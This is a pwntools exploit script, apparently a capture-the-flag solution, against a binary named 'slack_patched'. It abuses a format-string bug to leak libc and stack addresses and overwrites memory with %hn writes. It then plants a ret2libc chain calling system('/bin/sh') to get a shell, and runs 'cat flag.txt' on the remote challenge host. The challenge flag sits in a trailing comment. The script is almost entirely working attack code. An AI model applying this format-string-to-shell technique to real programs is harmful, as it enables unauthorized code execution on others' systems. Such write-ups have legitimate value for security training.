#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("slack_patched")
libc = elf.libc

local = True 
if local:
    p = process("./slack_patched")
    #gdb.attach(p,'''b*main+402\nc''')
else:
    p = remote('challs.actf.co', 31500)

elf = context.binary = ELF('./slack_patched', checksec=False)


p.sendlineafter(b"Your message (to increase character limit, pay $99 to upgrade to Professional):", b"%21$p%25$p")
p.recvuntil(b"0x")
libc_base = int(p.recv(12),16) - 171408
system = libc_base + 0x50d60
binsh = libc_base +  0x1d8698
pop_rdi = libc_base + 0x000000000002a3e5
ret = libc_base + 0x0000000000029cd6

print("[+]Libc_base:        ", hex(libc_base))
print("[+]System:           ", hex(system))
print("[+]Bin_sh:           ", hex(binsh))

p.recv(2)
ret_addr = int(p.recv(12),16) - 248 -24
i_addr = ret_addr - 0x70 +3
print("\n[+]Return_addr:    ", hex(ret_addr))
print("\n[+]I_value_addr:   ", hex(i_addr))
print("\n[+]I_addr_in_stack:   ", hex(ret_addr-56))
print("\n[+]Ret_addr_in_stack:   ", hex(ret_addr))


x_value = i_addr & 0xffff
p.sendafter(b"Your message (to increase character limit, pay $99 to upgrade to Professional):",b"%" + str(x_value).encode() + b"x%25$hn")
p.sendline(b"%128x%55$hhn")

# Loop_done

####### ret2libc #######
def rop_chain(addr, value):
    x_value2 = addr & 0xffff
    p.sendline(b"%" + str(x_value2).encode() + b"x%28$hn")
    x_value3 = value & 0xffff
    p.sendline(b"%" + str(x_value3).encode() + b"x%55$hn")
    x_value2 = addr+2 & 0xffff
    p.sendline(b"%" + str(x_value2).encode() + b"x%28$hn")
    x_value3 = (value & 0xffff0000) >> 4*4
    p.sendline(b"%" + str(x_value3).encode() + b"x%55$hn")
    x_value2 = addr+4 & 0xffff
    p.sendline(b"%" + str(x_value2).encode() + b"x%28$hn")
    x_value3 = (value & 0xffff00000000) >> 4*8
    p.sendline(b"%" + str(x_value3).encode() + b"x%55$n")
    

rop_chain(ret_addr, ret)
rop_chain(ret_addr+8, pop_rdi)
rop_chain(ret_addr+16, binsh)
rop_chain(ret_addr+24, system)

#make i become normal
p.sendafter(b"Your message (to increase character limit, pay $99 to upgrade to Professional):",b"%" + str(x_value).encode() + b"x%25$hn")
p.sendafter(b"Your message (to increase character limit, pay $99 to upgrade to Professional):",b"%10x%55$hhn%55$p")

#%52$p
#%14$p
#%9$p - leak libc

if local:
    p.sendline(b"id")
else:
    sleep(2)
    p.sendline(b"cat flag.txt")

p.interactive()


#actf{succesfu1_onb0arding_f99454d9a2f42632}